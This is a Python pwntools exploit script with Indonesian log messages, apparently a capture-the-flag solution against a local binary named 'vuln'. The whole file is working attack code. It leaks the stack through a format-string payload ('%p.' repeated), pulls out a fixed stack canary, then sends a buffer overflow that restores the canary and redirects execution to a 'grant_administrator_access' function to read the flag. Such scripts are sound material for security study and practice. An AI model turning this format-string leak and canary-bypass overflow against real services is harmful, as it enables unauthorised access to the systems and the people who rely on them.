#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
host, port = "localhost", 56933

offset_to_canary = 64
padding_after_canary = 12

log.info("Tahap 1: Mengekstrak Kode Bypass 'Digital Canary'...")
p = remote(host, port)

p.sendlineafter(b"> ", b"2")

format_string_payload = b"%p." * 10 
p.sendlineafter(b"diagnostik: ", format_string_payload)

p.recvuntil(b"Diagnostik: ")
leaked_data = p.recvline().strip().decode()
log.info(f"Data mentah yang bocor dari stack: {leaked_data}")

leaked_canary = None
for value in leaked_data.split('.'):
    if "21574153" in value:
        leaked_canary = p32(0x21574153)
        break

if not leaked_canary:
    log.failure("Gagal menemukan Kode Bypass di data yang bocor!")
    exit()

log.success(f"Kode Bypass 'Digital Canary' ditemukan: {leaked_canary.hex()}")
p.close()

log.info("Tahap 2: Merakit payload buffer overflow...")
win_addr = elf.symbols['grant_administrator_access']
log.info(f"Alamat memori untuk mendapatkan akses: {hex(win_addr)}")

payload = flat([
    b'A' * offset_to_canary,
    leaked_canary,
    b'B' * padding_after_canary,
    win_addr
])

p = remote(host, port)

p.sendlineafter(b"> ", b"1")
p.sendafter(b"> ", payload)

flag = p.recvall(timeout=2)
log.success(f"KUNCI AKSES MAINFRAME: {flag.decode().strip()}")

